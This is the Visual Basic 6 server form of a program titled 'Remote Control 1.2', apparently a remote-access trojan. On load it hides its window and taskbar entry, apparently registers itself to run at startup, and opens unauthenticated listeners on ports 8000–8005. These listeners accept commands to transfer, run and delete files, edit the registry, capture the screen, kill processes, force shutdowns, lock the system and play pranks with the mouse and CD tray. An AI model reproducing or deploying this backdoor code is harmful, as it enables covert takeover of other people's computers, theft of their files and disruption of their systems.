VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form ServerForm 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Remote Control 1.2"
   ClientHeight    =   1710
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   3420
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1710
   ScaleWidth      =   3420
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock sckControlPanel 
      Left            =   2805
      Top             =   150
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckTaskManager 
      Left            =   2283
      Top             =   150
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   5
      Left            =   1500
      Top             =   870
   End
   Begin VB.PictureBox Picture1 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      Height          =   825
      Left            =   1073
      ScaleHeight     =   51
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   81
      TabIndex        =   0
      Top             =   690
      Visible         =   0   'False
      Width           =   1275
   End
   Begin MSWinsockLib.Winsock sckDesktop 
      Left            =   1761
      Top             =   150
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckReg 
      Left            =   1239
      Top             =   150
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckExplorer 
      Left            =   717
      Top             =   150
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckIdentifier 
      Left            =   195
      Top             =   150
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "ServerForm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim FileNumber As Integer

Private Sub Form_Load()
On Error Resume Next
    If App.PrevInstance = True Then
        Unload Me
        Exit Sub
    End If
    App.TaskVisible = False
    Me.Hide
        
    Call AddInRun
    sckIdentifier.LocalPort = 8000
    sckIdentifier.Listen
    sckExplorer.LocalPort = 8001
    sckExplorer.Listen
    sckReg.LocalPort = 8002
    sckReg.Listen
    sckDesktop.LocalPort = 8003
    sckDesktop.Listen
    sckTaskManager.LocalPort = 8004
    sckTaskManager.Listen
    sckControlPanel.LocalPort = 8005
    sckControlPanel.Listen
End Sub

Private Sub sckControlPanel_Close()
    If sckControlPanel.State <> sckNotConnected Then
        sckControlPanel.Close
        sckControlPanel.Listen
    End If
End Sub

Private Sub sckControlPanel_ConnectionRequest(ByVal requestID As Long)
    If sckControlPanel.State <> sckClosed Then
        sckControlPanel.Close
        sckControlPanel.Accept requestID
    End If
End Sub

Private Sub sckControlPanel_DataArrival(ByVal bytesTotal As Long)
Dim Command As String, txtData As String
Dim Position As Integer
    
On Error Resume Next
    sckControlPanel.GetData txtData
    
    Position = InStr(1, txtData, "#")
    Command = Left(txtData, Position - 1)
    txtData = Mid(txtData, Position + 1)
    
    Select Case Command
        Case "WWW"
            ShellExecute Me.hwnd, "open", "http://" & _
            txtData, vbNullString, "C:\", 0&
        Case "SetClipboard"
            Clipboard.SetText txtData
        Case "EMail"
            ShellExecute Me.hwnd, "open", "mailto:" & _
            txtData, vbNullString, "C:\", 0&
        Case "Paint"
            Shell "C:\WinNT\System32\MSPaint.EXE", vbNormalFocus
            'ShellExecute Me.hwnd, "open", "C:\WinNt\system32\mspaint.exe", _
            vbNullString, "C:\", 0&
        Case "Notepad"
            Shell "C:\WinNT\Notepad.EXE", vbNormalFocus
            'ShellExecute Me.hwnd, "open", "c:\winnt\notepad.exe", _
            vbNullString, "C:\", 0&
        Case "Solitaire"
            Shell "C:\WinNT\System32\Sol.exe", vbNormalFocus
            'ShellExecute Me.hwnd, "open", "c:\winnt\system32\sol.exe", _
            vbNullString, "C:\", 0&
        Case "SwapMouse"
            SwapMouse (txtData)
        Case "ClipCursor"
            Call ClipPointer
        Case "UnClipCursor"
            Call UnClipPointer
        Case "ScreenSaver"
            RunScreenSaver
        Case "MouseSpeed"
            SetMouseDoubleClickTime (txtData)
        Case "CDDoor"
            If txtData = "Open" Then
                OpenCDDoor
            Else
                CloseCDDoor
            End If
        Case "LockSystem"
            SystemParametersInfo SPI_SCREENSAVERRUNNING, _
            1&, Null, SPIF_UPDATEINIFILE
            LockForm.Show
        Case "Logoff"
            ExitWindowsEx (EWX_FORCE Or EWX_LOGOFF), 0&
        Case "Reboot"
            ExitWindowsEx (EWX_FORCE Or EWX_REBOOT), 0&
        Case "Shutdown"
            ExitWindowsEx (EWX_FORCE Or EWX_SHUTDOWN), 0&
        Case "GetUserName"
            txtData = GetUser()
            sckControlPanel.SendData "GetUserName#" & txtData
        Case "GetTickCount"
            txtData = GetLoginTime
            sckControlPanel.SendData "GetTickCount#" & txtData
        Case "SystemInfo"
            txtData = "SystemInfo#" & SystemInfo()
            sckControlPanel.SendData txtData
        Case "CrezyMouse"
            Timer1.Enabled = True
        Case "NormalMouse"
            Timer1.Enabled = False
        Case "Message"
            MsgBox txtData, vbExclamation, "Windows Message"
        Case "Date&Time"
        Case "Mouse"
    End Select
End Sub

Private Sub sckDesktop_Close()
    If sckDesktop.State <> sckNotConnected Then
        sckDesktop.Close
        sckDesktop.Listen
    End If
End Sub

Private Sub sckDesktop_ConnectionRequest(ByVal requestID As Long)
    If sckDesktop.State <> sckClosed Then
        sckDesktop.Close
        sckDesktop.Accept requestID
    End If
End Sub

Private Sub sckDesktop_DataArrival(ByVal bytesTotal As Long)
Dim txtData As String, Command As String
Dim Position As Long, FilePath As String
Dim x As Integer, y As Integer

On Error Resume Next
    sckDesktop.GetData txtData
    
    Position = InStr(1, txtData, "#")
    Command = Left(txtData, Position - 1)
    txtData = Mid(txtData, Position + 1)
    
    Select Case Command
        Case "GetRECT"
            txtData = "GetRECT#" & GetRect()
            sckDesktop.SendData txtData
        Case "GetDesktop"
            FilePath = CopyDesktop()
            'Sleep (5)
            SendDesktop FilePath, sckDesktop
        Case "LeftButtonDown"
            Position = InStr(1, txtData, "#")
            x = Val(Left(txtData, Position - 1))
            txtData = Mid(txtData, Position + 1)
            Position = InStr(1, txtData, "#")
            y = Val(Left(txtData, Position - 1))
            SetCursorPos x, y
            mouse_event MOUSEEVENTF_ABSOLUTE Or MOUSEEVENTF_LEFTDOWN, 0&, 0&, 0&, 0&
            mouse_event MOUSEEVENTF_ABSOLUTE Or MOUSEEVENTF_LEFTUP, 0&, 0&, 0&, 0&
        'Case "LeftButtomUp"
    End Select
    
End Sub

Private Sub sckExplorer_Close()
    If sckExplorer.State <> sckNotConnected Then
        sckExplorer.Close
        sckExplorer.Listen
    End If
End Sub

Private Sub sckExplorer_ConnectionRequest(ByVal requestID As Long)
    If sckExplorer.State <> sckClosed Then
        sckExplorer.Close
        sckExplorer.Accept requestID
    End If
End Sub

Private Sub sckExplorer_DataArrival(ByVal bytesTotal As Long)
Dim Command As String, txtData As String
Dim Position As Integer, Folders As String
Dim FilePath As String
Dim retVal As Long, SecAttrib As SECURITY_ATTRIBUTES

On Error Resume Next
    sckExplorer.GetData txtData
    Position = InStr(1, txtData, "#")
    Command = Left(txtData, Position - 1)
    txtData = Mid(txtData, Position + 1)
    Select Case Command
        Case "GetDrives"
            txtData = GetDrives()
            sckExplorer.SendData "GetDrives#" & txtData
        Case "GetFolders"
            txtData = GetFolders(txtData)
            sckExplorer.SendData "GetFolders#" & txtData
        Case "GetFiles"
            txtData = GetFiles(txtData)
            sckExplorer.SendData "GetFiles#" & txtData
        Case "DownloadFile"
            CancelDownload = False
            DownloadFile txtData, sckExplorer
        Case "CancelDownload"
            CancelDownload = True
        Case "SendFileName"
            DoEvents
            FilePath = txtData
            FileNumber = FreeFile()
            Open FilePath For Binary As #FileNumber
        Case "SendData"
            Put #FileNumber, , txtData
            DoEvents
        Case "SendComplete"
            DoEvents
            Close #FileNumber
        Case "CreateDirectory"
            retVal = CreateDirectory(txtData, SecAttrib)
            If retVal <> 0 Then _
                sckExplorer.SendData "CreateDirectory#" & Mid(txtData, InStrRev(txtData, "\") + 1)
        Case "RunFile"
            ShellExecute Me.hwnd, vbNullString, txtData, vbNullString, "C:\", SW_SHOWNORMAL
        Case "DeleteFile"
            SetFileAttributes txtData, FILE_ATTRIBUTE_NORMAL
            DeleteFile txtData
    End Select
End Sub

Private Sub sckIdentifier_Close()
    If sckIdentifier.State <> sckClosed Then
        sckIdentifier.Close
        sckIdentifier.Listen
        Unload ChatForm
        sckExplorer.Close
        sckExplorer.Listen
        sckReg.Close
        sckReg.Listen
        sckDesktop.Close
        sckDesktop.Listen
        sckTaskManager.Close
        sckTaskManager.Listen
        sckControlPanel.Close
        sckControlPanel.Listen
    End If
End Sub

Private Sub sckIdentifier_ConnectionRequest(ByVal requestID As Long)
    If sckIdentifier.State <> sckClosed Then
        sckIdentifier.Close
        sckIdentifier.Accept requestID
    End If
End Sub

Private Sub sckIdentifier_DataArrival(ByVal bytesTotal As Long)
Dim Command As String, txtData As String
Dim Position As Integer

On Error Resume Next
    sckIdentifier.GetData txtData
    Position = InStr(1, txtData, "#")
    Command = Left(txtData, Position - 1)
    txtData = Mid(txtData, Position + 1)
    Select Case Command
        Case "Chat"
            ChatForm.Show
    End Select
End Sub

Private Sub sckReg_Close()
    If sckReg.State = sckNotConnected Then
        sckReg.Close
        sckReg.Listen
    End If
End Sub

Private Sub sckReg_ConnectionRequest(ByVal requestID As Long)
    If sckReg.State <> sckClosed Then
        sckReg.Close
        sckReg.Accept requestID
    End If
End Sub

Private Sub sckReg_DataArrival(ByVal bytesTotal As Long)
Dim Command As String, Position As Integer
Dim txtData As String
    
On Error Resume Next
    sckReg.GetData txtData
    
    Position = InStr(1, txtData, "#")
    Command = Left(txtData, Position - 1)
    txtData = Mid(txtData, Position + 1)
    
    Select Case Command
        Case "AddKey"
            txtData = AddKey(txtData)
            sckReg.SendData txtData
        Case "DeleteKey"
            txtData = DeleteKey(txtData)
            sckReg.SendData txtData
        Case "AddValue"
            txtData = AddValue(txtData)
            sckReg.SendData txtData
        Case "DeleteValue"
            txtData = DeleteValue(txtData)
            sckReg.SendData txtData
        Case "ShowValue"
            txtData = ShowValue(txtData)
            sckReg.SendData txtData
    End Select
    
End Sub

Private Sub sckTaskManager_Close()
    'If sckTaskManager.State = sckNotConnected Then
        sckTaskManager.Close
        sckTaskManager.Listen
    'End If
End Sub

Private Sub sckTaskManager_ConnectionRequest(ByVal requestID As Long)
    If sckTaskManager.State <> sckClosed Then
        sckTaskManager.Close
        sckTaskManager.Accept requestID
    End If
End Sub

Private Sub sckTaskManager_DataArrival(ByVal bytesTotal As Long)
Dim Command As String, txtData As String
Dim Position As Integer

On Error Resume Next
    sckTaskManager.GetData txtData
    
    Position = InStr(1, txtData, "#")
    Command = Left(txtData, Position - 1)
    txtData = Mid(txtData, Position + 1)
    
    Select Case Command
        Case "GetTaskList"
            txtData = "GetTaskList#" & GetTaskList()
            sckTaskManager.SendData txtData
        Case "KillTask"
            KillTask (txtData)
            sckTaskManager.SendData "KillTask#"
    End Select
End Sub

Private Sub TalkTimer_Timer()
    
End Sub

Private Sub Timer1_Timer()
    CrezyMouse
End Sub
